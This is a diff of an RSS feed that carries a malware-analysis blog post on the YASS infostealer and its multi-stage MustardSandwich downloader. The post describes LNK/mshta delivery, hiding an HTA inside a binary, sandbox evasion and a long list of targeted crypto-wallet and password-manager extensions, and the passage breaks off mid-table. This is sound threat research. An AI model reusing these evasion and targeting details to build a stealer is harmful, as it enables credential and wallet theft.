@@ -1,4 +1,655 @@
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Intezer Research – Stealer</title><link>https://research.intezer.com/tags/stealer/</link><description>Recent content in Stealer on Intezer Research</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 24 May 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://research.intezer.com/tags/stealer/index.xml" rel="self" type="application/rss+xml"/><item><title>CryptoClippy is Evolving to Pilfer Even More Financial Data</title><link>https://research.intezer.com/blog/2023/05/cryptoclippy-evolves-to-pilfer-more-financial-data/</link><pubDate>Wed, 24 May 2023 00:00:00 +0000</pubDate><guid>https://research.intezer.com/blog/2023/05/cryptoclippy-evolves-to-pilfer-more-financial-data/</guid><description>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Intezer Research – Stealer</title><link>https://research.intezer.com/tags/stealer/</link><description>Recent content in Stealer on Intezer Research</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 10 Sep 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://research.intezer.com/tags/stealer/index.xml" rel="self" type="application/rss+xml"/><item><title>There's Something About CryptBot: Yet Another Silly Stealer (YASS)</title><link>https://research.intezer.com/blog/2024/09/cryptbot-yet-another-silly-stealer-yass/</link><pubDate>Tue, 10 Sep 2024 00:00:00 +0000</pubDate><guid>https://research.intezer.com/blog/2024/09/cryptbot-yet-another-silly-stealer-yass/</guid><description>
+&lt;p&gt;Recently Intezer was investigating a file that we came across during
+&lt;a href="https://intezer.com/blog/incident-response/how-intezer-works/"target="_blank" rel="noopener"&gt;alert triage&lt;/a&gt;.
+This particular file piqued our interest due to the interesting delivery chain,
+and the even more interesting payload, an intricate infostealer.&lt;/p&gt;
+&lt;p&gt;Intezer has amazing
+&lt;a href="https://intezer.com/blog/malware-analysis/code-strings-and-whats-in-between/"target="_blank" rel="noopener"&gt;code genetic analysis technology&lt;/a&gt;,
+showing us overlaps of code reuse between different files, malicious or not. We
+noticed that the payload &lt;em&gt;did not have significant code overlap&lt;/em&gt; with other
+infostealers. Upon researching the threat and pivoting to similar samples, we
+understand that other vendors are labeling this as &lt;strong&gt;CryptBot&lt;/strong&gt;. While the
+similarities are undeniable, the differences in code are significant enough
+that this version warrants its own documentation, and even its own name, &lt;strong&gt;Yet
+Another Silly Stealer&lt;/strong&gt; (YASS). In this blog, we&amp;rsquo;ll highlight both the
+parallels and the distinctions between these two infostealers, underscoring why
+this variant demands attention. This blog will give a technical analysis of the
+delivery chain, as well as an analysis of the &lt;strong&gt;YASS payload&lt;/strong&gt;. The stealer was
+delivered using a multi-stage downloader that we are calling
+&lt;strong&gt;MustardSandwich&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;The cybersecurity landscape is constantly witnessing a wave in the creation of
+new and updated infostealers, with malware developers continuously innovating
+to bypass defenses. While it may feel like a never-ending cat-and-mouse game,
+cataloging as many of these stealers as possible remains crucial. By doing so,
+we can better understand emerging tactics, enhance threat detection, and
+ultimately protect our sensitive data. Every new variant cataloged strengthens
+our defenses and helps to anticipate future threats, making the effort vital
+despite the relentless pace of cybercriminal innovation.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/blog/2024/09/cryptbot-yet-another-silly-stealer-yass/images/fig1.png" title="Attack Flow of new YASS infostealer, with some similarities and notable difference from Cryptbot" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Attack Flow of new YASS infostealer, with some similarities and notable difference from Cryptbot&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h2&gt;Mustard Sandwich Downloader&lt;span class="hx:absolute hx:-mt-20" id="mustard-sandwich-downloader"&gt;&lt;/span&gt;
+&lt;a href="#mustard-sandwich-downloader" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;In the cases where we have identified the MustardSandwich downloader, it has
+been executed using a
+&lt;a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943"target="_blank" rel="noopener"&gt;Windows shell link&lt;/a&gt;
+(LNK) file. The LNK file uses the Windows system binary &lt;code&gt;forfiles.exe&lt;/code&gt; to
+invoke &lt;code&gt;PowerShell&lt;/code&gt; which calls &lt;code&gt;mshta&lt;/code&gt;. An example of the command line
+arguments for one of the LNK files is shown below.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/blog/2024/09/cryptbot-yet-another-silly-stealer-yass/images/fig2.png" title="LNK File Arguments" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;LNK File Arguments&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;The LNK files are used to execute a Microsoft HTML application (HTA) using
+&lt;code&gt;mshta&lt;/code&gt;. The malware abuses the looseness of the &lt;code&gt;mshta&lt;/code&gt; parser to hide the
+HTML within &amp;ldquo;junk&amp;rdquo; data. The HTML document has been broken up into multiple
+parts and &amp;ldquo;sandwiched&amp;rdquo; between multiple copies of the same Windows binary. The
+screenshot below shows the output from binwalk of one of the files with
+annotations showing where the different parts of the document are located.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/blog/2024/09/cryptbot-yet-another-silly-stealer-yass/images/fig3.png" title="Binwalk output of the EXE containing HTA" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Binwalk output of the EXE containing HTA&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;This technique provides some anti-analysis by automated solutions because most
+solutions will identify the file as a Windows executable (PE). When the file is
+executed in a sandbox, nothing malicious will happen. To invoke the malicious
+code, &lt;code&gt;mshta&lt;/code&gt; must be used.&lt;/p&gt;
+&lt;p&gt;The downloader consists of two JScript stages and two PowerShell stages. The
+first PowerShell script is executed via an ActiveXObject, as seen in the
+screenshot below.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/blog/2024/09/cryptbot-yet-another-silly-stealer-yass/images/fig4.png" title="JScript Payload" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;JScript Payload&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;The first PowerShell script decrypts the final stages. The stage has been
+encrypted using AES, and the key varies between attacks. An example of the
+stages is shown below.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/blog/2024/09/cryptbot-yet-another-silly-stealer-yass/images/fig5.png" title="PowerShell Payload" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;PowerShell Payload&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;The final stage is responsible for downloading the decoy and the malware to run
+on the machine. We have observed two types of this stage, one that downloads
+multiple payloads and another that only downloads one payload.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/blog/2024/09/cryptbot-yet-another-silly-stealer-yass/images/fig6.png" title="Decoy Video" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Decoy Video&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;The screenshot below shows a cleaned-up version of the &amp;ldquo;main&amp;rdquo; script function.
+First, it checks if the lure exists on disk, if not, it&amp;rsquo;s downloaded and
+displayed to the user. This version also appears to be tracking installations
+by sending a simple web request to a separate URL. After the lure has been
+displayed to the user, the two payloads are downloaded and executed.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/blog/2024/09/cryptbot-yet-another-silly-stealer-yass/images/fig7.png" title="PowerShell Downloading Additional Payloads" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;PowerShell Downloading Additional Payloads&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;The URLs hosting the payloads have been obfuscated with a simple logic. Each
+character in the string has been converted to an integer and a constant has
+been added to each one. The function shown below is used to reverse the
+obfuscation.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/blog/2024/09/cryptbot-yet-another-silly-stealer-yass/images/fig8.png" title="Decoding Function" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Decoding Function&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;The payloads are downloaded as ZIP archives. The stage uses the function shown
+below to extract the content and execute the payload. It&amp;rsquo;s worth noting that
+the function executes the first file from an alphabetic sort of the content of
+the archive.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/blog/2024/09/cryptbot-yet-another-silly-stealer-yass/images/fig9.png" title="Running First File in Archive" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Running First File in Archive&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;The simpler version of this stage, from a related chain, is shown below. It
+doesn&amp;rsquo;t expect the payloads to be stored in ZIP files, nor have the install
+tracking functionality.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/blog/2024/09/cryptbot-yet-another-silly-stealer-yass/images/fig10.png" title="Simplified Version of Related Chain" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Simplified Version of Related Chain&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h2&gt;IDATLOADER&lt;span class="hx:absolute hx:-mt-20" id="idatloader"&gt;&lt;/span&gt;
+&lt;a href="#idatloader" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Inside the second downloaded ZIP file (&lt;code&gt;L2.zip&lt;/code&gt;) is a single executable file.
+This is a Delphi file
+(&lt;code&gt;4810333bf96fb808604f3657118c734c3dd8ee4baa3e6ffe8da548ae0c8e15d3&lt;/code&gt;) that
+contains a lot of boiler plate code for Delphi visual components.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/blog/2024/09/cryptbot-yet-another-silly-stealer-yass/images/fig11.png" title="IDATLOADER File" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;IDATLOADER File&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;The code for starting IDATLoader is hidden amongst all the boiler plate code.
+IDATLOADER will inject shellcode into &lt;code&gt;pla.dll&lt;/code&gt; that will then extract a PNG
+resource from the Delphi file and move it into the Temp folder.&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2024/09/cryptbot-yet-another-silly-stealer-yass/images/fig12.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/blog/2024/09/cryptbot-yet-another-silly-stealer-yass/images/fig13.webp" title="PNG Containing Payload" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;PNG Containing Payload&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;From this PNG, the payload is extracted, a stealer.
+(&lt;code&gt;7ac46eb84f4b6d25601f23d2c30b7e80b6f3b2d82d3240234fc50af75290a29f&lt;/code&gt;)&lt;/p&gt;
+&lt;h2&gt;Technical Analysis of Infostealer&lt;span class="hx:absolute hx:-mt-20" id="technical-analysis-of-infostealer"&gt;&lt;/span&gt;
+&lt;a href="#technical-analysis-of-infostealer" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3&gt;Initialisation&lt;span class="hx:absolute hx:-mt-20" id="initialisation"&gt;&lt;/span&gt;
+&lt;a href="#initialisation" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;YASS starts its operations by performing a sleep. Then the stealer will decrypt
+a block of strings that are used as global variables for the stealer&amp;rsquo;s
+functionality. There are two blocks of RC4 encrypted strings. A small key is
+hardcoded via stack strings in the binary for decryption. The two blocks of
+strings are the same strings but one is a wide char and the other is normal
+ASCII.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/blog/2024/09/cryptbot-yet-another-silly-stealer-yass/images/fig14.png" title="Decrypted Strings" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Decrypted Strings&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;This block of strings contains important information such as C2 information,
+staging folders, persistence strings and functions to be dynamically resolved.
+The full list of decoded strings are located
+&lt;a href="https://gist.github.com/aslefhewqiwbepqwefbpqsciwueh/12516114c9d4b99f4a29704c75969f4a"target="_blank" rel="noopener"&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Next the stealer will fetch two environment variables.&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;LocalAppData: Gives appdata/local path
+UserProfile: Gives path to user home&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;These variables are concatenated with two strings, in order to check for their
+presence.&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;C:\Users\[username]\AppData\Local\Gabatepi
+C:\Users\admin\Desktop\Invoice.docx&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;The malware will exit if either exists at this point. The first path is the
+location of a folder, seemingly used as a mutex to ensure only one running
+instance. The latter appears to be an anti sandbox check.&lt;/p&gt;
+&lt;p&gt;If the staging folder does not exist, the stealer will not exit, and will
+create this directory.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/blog/2024/09/cryptbot-yet-another-silly-stealer-yass/images/fig15.png" title="Folder used as Mutex" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Folder used as Mutex&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Before stealing activities begin the stealer will generate a unique user ID,
+ZIP it, and send it to the C2.&lt;/p&gt;
+&lt;h3&gt;Location of Sensitive Data&lt;span class="hx:absolute hx:-mt-20" id="location-of-sensitive-data"&gt;&lt;/span&gt;
+&lt;a href="#location-of-sensitive-data" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;YASS starts its stealing activities by locating directories where sensitive
+data is commonly held. It starts a recursive search from the user profile path:&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;C:Users[username]&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;The stealer will start to iterate over each file. The file path is compared
+against a very large hard coded list of directories. The directories cover many
+categories, including programming, gaming, messaging, cloud storage, Office
+products, torrent, utilities, and antivirus.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/blog/2024/09/cryptbot-yet-another-silly-stealer-yass/images/fig16.png" title="Snippet of Targeted Directories" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Snippet of Targeted Directories&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;If there is a directory match. The stealer will make a check for the folder:&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;Local Extension Settings&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;If this is the current folder. The stealer will identify folders related to
+targeted Opera and Google Chrome Extensions.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/blog/2024/09/cryptbot-yet-another-silly-stealer-yass/images/fig17.png" title="Check for Browser Extensions" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Check for Browser Extensions&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Targeted Extensions:&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style="text-align: left"&gt;Extension&lt;/th&gt;
+&lt;th style="text-align: left"&gt;Product&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;nkbihfbeogaeaoehlefnkodbefgpgknn&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;MetaMask&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;ejbalbakoplchlghecdalmeeeajnimhm&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;MetaMask&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;ljfoeinjpaedjfecbmggjgodbgkmjkjk&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;MetaMask&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;nkbihfbeogaeaoehlefnkodbefgpgknn&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;MetaMask&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;bfnaelmomeimhlpmgjnjophhpkkoljpa&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;Phantom&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;ibnejdfjmmkpcnlpebklmnkoeoihofec&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;TronLink&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;fhbohimaelbohpjbbldcngcnapndodjp&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;BNB Chain Wallet&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;jnlgamecbpmbajjfhmmmlhejkemejdma&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;Braavos&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;dlcobpjiigpikoobohmabehhmhfoodbb&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;Argent X&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;fnjhmkhhmkbjkkabndcnnogagogbneec&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;Ronin Wallet&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;afbcbjpbpfadlkmhmclhkeeodmamcflc&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;Math Wallet&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;fhilaheimglignddkjgofkcbgekhenbh&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;Oxygen&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;ffnbelfdoeiohenkjibnmadjiehjhajb&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;Yoroi&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;mopnmbcafieddcagagdcbnhejhlodfdd&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;Polkadot&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;bhhhlbepdkbapadjdnnojkbgioiodbic&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;Solflare Wallet&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;opcgpfmipidbgpenhmajoajpbobppdil&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;Sui Wallet&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;nngceckbapebfimnlniiiahkandclblb&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;Bitwarden&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;hdokiejnpimakedhajhdlcegeplioahd&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;LastPass&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;kkpllkodjeloidieedojogacfhpaihoh&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;Enkrypt Wallet&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;acmacodkjbdgmoleebolmdjonilkdbch&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;Rabby Wallet&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;gaedmjdfmmahhbjefcbgaolhhanlaolb&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;Authy&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;hifafgmccdpekplomjjkcfgodnhcellj&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;Crypto.com&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;klnaejjgbibmhlephnhpmaofohgkpgkd&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;ZilPay&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;aholpfdialjgjfhomihkjbmgjidlcdno&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;Exodus Web3 Wallet&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;egjidjbpglichdcondbcbdnbeeppgdph&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;Trust Wallet&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;efbglgofoippbgcjepnhiblaibcnclgk&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;Martian&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;mcohilncbfahbmgdjkbpemcciiolgcge&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;OKX Wallet&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;bhghoamapcdpbohphigoooaddinpkbai&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;Authenticator&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;aflkmfhebedbjioipglgcbcmnbpgliof&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;Backpack&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;idnnbdplmphpflfnlkomgpfbpcgelopg&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;Xverse Wallet&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;ppbibelpcjmhbdihakflkdcoccbgbkpo&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;UniSat Wallet&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;omaabbefbmiijedngplfjmnooppbclkk&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;Tonkeeper&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;lgmpcpglpngdoalbgeoldeajfclnhafa&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;SafePal Extension Wallet&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;dmkamcknogkgcdfhhbddcghachkejeap&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;Keplr&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
